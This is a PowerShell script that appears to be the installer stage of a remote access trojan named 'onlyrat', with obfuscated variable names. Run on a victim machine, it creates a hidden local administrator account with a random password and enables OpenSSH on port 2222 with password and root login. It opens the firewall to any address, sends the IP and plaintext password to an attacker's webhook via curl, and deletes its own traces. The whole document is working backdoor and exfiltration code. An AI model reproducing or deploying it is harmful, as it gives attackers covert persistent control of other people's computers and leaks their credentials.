function RpLGWiUsIy {
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {[char]$_})
}

function geIwCZloBx {
    [CmdletBinding()]
    param (
        [string] $sqbXFdLvyw,
        [securestring] $CBFXIYeWPR
    )    
    begin {
    }    
    process {
        New-LocalUser "$sqbXFdLvyw" -Password $CBFXIYeWPR -FullName "$sqbXFdLvyw" -Description "Temporary local admin"
        Write-Verbose "$sqbXFdLvyw local user crated"
        Add-LocalGroupMember -Group "Administrators" -Member "$sqbXFdLvyw"
        Write-Verbose "$sqbXFdLvyw added to the local administrator group"
    }    
    end {
    }
}

# make admin
$sqbXFdLvyw = "onlyrat"
$DCilJFugpP = RpLGWiUsIy
Remove-LocalUser -Name $sqbXFdLvyw
$HcMjDkGFes = (ConvertTo-SecureString $DCilJFugpP -AsPlainText -Force)
geIwCZloBx -sqbXFdLvyw $sqbXFdLvyw -CBFXIYeWPR $HcMjDkGFes

# registry
$csfMFzvgEN = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
$jmQikqoKMZ = '00000000'
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
# =============== SSH SECTION - PORT 2222 ===============
# ssh installation
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0

# Start SSH service
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

# Change SSH port to 2222 in config file
$sshdConfig = "C:\ProgramData\ssh\sshd_config"
if (Test-Path $sshdConfig) {
    # Backup original config
    Copy-Item $sshdConfig "$sshdConfig.backup" -Force
    
    # Change port to 2222
    $configContent = Get-Content $sshdConfig
    $configContent = $configContent -replace '#Port 22', 'Port 2222'
    $configContent = $configContent -replace 'Port 22', 'Port 2222'
    $configContent | Set-Content $sshdConfig
    
    # Ensure password auth is enabled
    $configContent = $configContent -replace '#PasswordAuthentication yes', 'PasswordAuthentication yes'
    $configContent = $configContent -replace 'PasswordAuthentication no', 'PasswordAuthentication yes'
    $configContent | Set-Content $sshdConfig
} else {
    # Create config if missing
    @"
Port 2222
PasswordAuthentication yes
PermitRootLogin yes
"@ | Out-File $sshdConfig -Encoding ASCII
}

# FIREWALL RULES for PORT 2222
Remove-NetFirewallRule -Name "SSH-2222-Allow" -ErrorAction SilentlyContinue

New-NetFirewallRule -Name "SSH-2222-Allow" `
  -DisplayName "SSH Port 2222 Allow" `
  -Enabled True `
  -Direction Inbound `
  -Protocol TCP `
  -LocalPort 2222 `
  -RemoteAddress Any `
  -Profile Domain,Private,Public `
  -Action Allow

# Restart SSH to apply port change
Restart-Service sshd -Force

# Test new port
Start-Sleep -Seconds 2
Test-NetConnection -ComputerName localhost -Port 2222
# =============== END SSH SECTION ===============

# rat file
$CRYnrkaDbe = "$env:UserName.rat"
$AhdjktGyiZ = (Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

New-Item -Path $CRYnrkaDbe -Force
Add-Content -Path $CRYnrkaDbe -Value $AhdjktGyiZ -Force # local ip addr
Add-Content -Path $CRYnrkaDbe -Value $DCilJFugpP -Force # pass
Add-Content -Path $CRYnrkaDbe -Value $env:temp -Force # temp
Add-Content -Path $CRYnrkaDbe -Value $pwd -Force # startup
Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # remote host
Add-Content -Path $CRYnrkaDbe -Value "N/A" -Force # SSH PORT - MUST BE 22 FOR LOCAL CONNECTIONS
Add-Content -Path $CRYnrkaDbe -Value 'local' -Force # connection type

# send file to webhook
$PEBgxuJUfd = Get-Content lawFvVTikZ.txt | Out-String
Invoke-Expression "curl.exe -F `"payload_json={\```"username\```": \```"onlyrat\```", \```"content\```": \```"download me\```"}`" -F ```"file=@$env:username.rat```" $PEBgxuJUfd"

# cleanup
attrib +h +s +r C:/Users/onlyrat 
Remove-Item $CRYnrkaDbe -Force
Remove-Item lawFvVTikZ.txt -Force
Remove-Item KFPGaEYdcz.ps1 -Force

# Optional: Display success message
Write-Host "[+] SSH Server installed and configured on port 22" -ForegroundColor Green
Write-Host "[+] Firewall rules added for all network profiles" -ForegroundColor Green
Write-Host "[+] .rat configuration file sent to webhook" -ForegroundColor Green
